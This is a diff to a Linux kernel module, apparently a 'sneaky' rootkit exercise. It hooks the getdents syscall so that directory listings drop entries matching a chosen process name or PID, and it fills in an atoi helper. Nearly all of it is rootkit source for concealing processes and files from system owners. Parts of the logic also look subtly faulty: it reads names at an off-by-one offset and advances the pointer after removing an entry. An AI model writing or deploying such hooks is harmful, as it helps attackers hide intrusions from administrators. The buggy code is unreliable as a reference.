@@ -56,26 +56,51 @@ asmlinkage int (*original_call)(const char *pathname, int flags);
 asmlinkage long (*orig_getdents)(unsigned int fd,
                                  struct linux_dirent64 __user *dirp,
                                  unsigned int count);
-asmlinkage long sneaky_sys_getdents(unsigned int fd,
-                                    struct linux_dirent64 __user *dirp,
-                                    unsigned int count) {
-  return (*orig_getdents)(fd, dirp, count);
-}
-// Define our new sneaky version of the 'open' syscall
-asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
-  return original_call(pathname, flags);
-}
-/*
+
 static int atoi(char *num) {
   int res = 0;
   while (*num != '\0') {
     if (*num < '0' || *num > '9')
       return -1;
     res = res * 10 + (*num - '0');
+    num++;
   }
   return res;
 }
-*/
+
+asmlinkage long sneaky_sys_getdents(unsigned int fd,
+                                    struct linux_dirent64 __user *dirp,
+                                    unsigned int count) {
+  long total;
+  long rest;
+  int cur_pid;
+  int len;
+  total = (*orig_getdents)(fd, dirp, count);
+  rest = total;
+
+  while (rest > 0) {
+    char *name;
+    len = dirp->d_reclen;
+    cur_pid = atoi(dirp->d_name - 1);
+    name = dirp->d_name - 1;
+    rest -= len;
+    if (strstr(name, processname) != NULL) {
+      memmove(dirp, (void *)dirp + dirp->d_reclen, rest);
+      total -= len;
+    } else if (cur_pid == pid) {
+      memmove(dirp, (void *)dirp + dirp->d_reclen, rest);
+      total -= len;
+    }
+    if (rest > 0)
+      dirp = (struct linux_dirent64 *)((void *)dirp + dirp->d_reclen);
+  }
+  return total;
+}
+// Define our new sneaky version of the 'open' syscall
+asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
+  return original_call(pathname, flags);
+}
+
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
   struct page *page_ptr;
